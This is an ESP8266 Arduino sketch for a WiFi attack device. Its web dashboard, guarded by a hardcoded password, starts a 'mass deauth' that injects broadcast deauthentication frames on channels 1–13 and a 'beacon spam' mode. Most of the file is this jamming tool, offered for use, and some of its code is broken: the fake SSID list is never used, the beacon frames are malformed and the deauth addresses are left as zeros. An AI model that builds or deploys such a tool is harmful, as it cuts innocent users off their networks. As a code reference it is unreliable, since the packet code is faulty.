#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <Wire.h>

extern "C" {
  void wifi_set_channel(uint8 channel);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

const char* admin_ssid = "GM-PRO_ULTIMATE";
const char* admin_pass = "sangkur87";
ESP8266WebServer server(80);
DNSServer dnsServer;

bool massDeauthActive = false;
bool spamActive = false;
String scanResults = "READY";
int packetCount = 0;

// Daftar WiFi Palsu untuk Beacon Spam
const char* fakeSSIDs[] = {
  "GM-PRO ERROR 404",
  "FREE WIFI (BOONG)",
  "ADA POLISI DI BELAKANG",
  "WIFI INI BAU TAI",
  "DATA ANDA SAYA AMBIL",
  "RICKROLL AREA"
};

// Dashboard Hacker V8.7
const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#000;color:#0f0;font-family:monospace;padding:10px;text-transform:uppercase}
  .card{border:1px solid #0f0;padding:15px;margin-bottom:10px;background:#111;box-shadow:inset 0 0 10px #0f0}
  .btn{display:block;width:100%;padding:12px;margin:8px 0;border:1px solid #0f0;background:0;color:#0f0;font-weight:bold;text-decoration:none;text-align:center;cursor:pointer}
  .red{border-color:#f00;color:#f00;box-shadow:0 0 5px #f00}
  .blue{border-color:#0af;color:#0af;box-shadow:0 0 5px #0af}
  .res{font-size:10px;color:#fff;max-height:100px;overflow-y:auto;border:1px solid #444;padding:5px}
  marquee{background:#0f0;color:#000;font-weight:bold}
</style></head><body>
<marquee>GM-PRO 86 ULTIMATE EDITION - SYSTEM ONLINE</marquee>
<div class="card">
  PKTS SENT: <span id="pkts">%PKTS%</span> | MODE: <span style="color:#fff">%STATUS%</span>
</div>
<div class="card">
  <a href="/attack" class="btn red">EXECUTE MASS DEAUTH</a>
  <a href="/spam" class="btn blue">START BEACON SPAM</a>
  <a href="/stop" class="btn">TERMINATE ALL</a>
</div>
<div class="card">
  <a href="/scan" class="btn">SCAN RADAR</a>
  <div class="res">%WIFILIST%</div>
</div>
<div class="card">
  <p style="font-size:9px">CAPTIVE PORTAL: ACTIVE (RICKROLL)</p>
</div>
</body></html>
)rawliteral";

void setup() {
  SPIFFS.begin();
  pinMode(2, OUTPUT);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", [](){
    String s = ADMIN_HTML;
    s.replace("%WIFILIST%", scanResults);
    s.replace("%STATUS%", massDeauthActive ? "DEAUTH" : (spamActive ? "SPAMMING" : "IDLE"));
    s.replace("%PKTS%", String(packetCount));
    server.send(200, "text/html", s);
  });

  server.on("/scan", [](){
    int n = WiFi.scanNetworks();
    scanResults = "";
    for (int i=0; i<n; ++i) scanResults += "<div>CH"+String(WiFi.channel(i))+" | "+WiFi.SSID(i)+"</div>";
    server.sendHeader("Location", "/");
    server.send(303);
  });

  server.on("/attack", [](){ massDeauthActive = true; spamActive = false; server.sendHeader("Location", "/"); server.send(303); });
  server.on("/spam", [](){ spamActive = true; massDeauthActive = false; server.sendHeader("Location", "/"); server.send(303); });
  server.on("/stop", [](){ massDeauthActive = spamActive = false; packetCount = 0; digitalWrite(2, HIGH); server.sendHeader("Location", "/"); server.send(303); });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (massDeauthActive) {
    uint8_t pkt[26] = {0xc0,0,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0};
    for (int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      for (int i=0; i<5; i++) { wifi_send_pkt_freedom(pkt, 26, 0); packetCount++; delay(1); }
      yield();
    }
  }

  if (spamActive) {
    for (int i=0; i<6; i++) {
      // Beacon frame sederhana untuk spam
      uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00 };
      wifi_send_pkt_freedom(packet, 60, 0);
      packetCount++;
      delay(10);
    }
  }
}
